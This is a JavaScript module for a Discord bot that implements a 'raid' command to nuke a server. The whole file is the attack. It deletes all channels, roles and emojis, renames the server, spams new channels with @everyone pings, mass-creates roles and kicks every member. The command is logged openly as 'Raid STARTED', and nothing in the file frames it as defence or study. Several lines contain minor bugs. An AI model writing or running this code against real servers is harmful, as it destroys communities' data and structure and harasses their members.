const configuration = require('../configuration.json');

module.exports = (message) =>
{
    var args = message.content.toLowerCase().trim().split(/ +/g);
    var arg1 = args[1];
    var arg2 = args[2];
    if(arg1 === undefined || arg1 === null) arg1 = "Raiding";
    if(arg2 === undefined || arg2 === null) arg2 = "30";

    message.delete();
    console.log(`Raid STARTED : [NAME : ${message.guild.name}, ID : ${message.guildId}]`)
    message.guild.setName(arg1);
    message.guild.setIcon(configuration.icon);

    //? Delete All Channels
    message.guild.channels.cache.forEach((ch) => {ch.delete().catch((err) => {console.log("ERROR: " + err)});
    });

    //? Delete All Roles
    message.guild.roles.cache.forEach((role) => {
        if (message.guild.me.roles.highest.position > role.position) {
            role.delete("Raiding").catch((err) => {console.log("ERROR: " + err)});
        }
    });

    //? Delete All Emojis
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Raiding" }));

    //? Create Channels
    for (var i = 0; i < arg2; i++) 
    {
        let channels = message.guild.channels.create(arg1);
        channels.then(
            function (channel, index) {
                for (var i = 0; i < arg2; i++){channel.send(`@everyone \`\`\`${arg1}\`\`\``)}
            }
        )
    }

    //?Create Roles
    for (let i = 0; i <= arg2; i++) 
    {
        message.guild.roles.create({ata:{name: `${arg1}`,position: i++,color: "RANDOM"}}).catch((err) => {console.log(red("ERROR: " + err + " #" + i))});
    }

    //? Kick All
    message.guild.members.cache.forEach(member => member.kick({ reason: arg1}).catch((err) => {console.log("ERROR: " + err)}));
}